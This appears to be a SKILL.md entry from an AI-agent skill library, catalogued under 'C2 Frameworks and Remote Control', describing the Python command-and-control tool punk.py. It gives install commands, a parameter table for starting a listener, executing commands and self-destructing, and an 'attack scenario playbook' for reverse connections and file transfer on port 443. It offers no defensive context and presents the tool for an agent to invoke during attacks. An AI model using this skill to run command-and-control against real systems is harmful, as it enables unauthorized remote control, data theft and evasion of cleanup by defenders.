---
name: punk-c2
description: "punk.py: Lightweight C2. Signals: C2, command and control, start C2, execution, self-destruct."
zh-signals: "punk.py: 轻量 C2。信号:c2,命令控制,起 C2,执行,自毁。"
when-to-use: >-
  Use when you need a lightweight Python command-and-control channel for reverse
  shell access, command execution, and file transfer; includes a self-destruct
  option.
---

# punk.py

- Attack Category: C35 C2 Frameworks and Remote Control
- Upstream Repository: https://github.com/r3vn/punk.py
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/r3vn/punk.py && cd punk.py && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python punk.py -l 10.0.0.5 -p 4444` | Start C2 |
| `-e 'cmd'` | Execute |
| `-s` | Self-destruct |

## Attack Scenario Playbook

### Lightweight C2

```bash
python punk.py -l 0.0.0.0 -p 443
# Reverse connection and file transfer
```

## Notes

Lightweight Python C2.
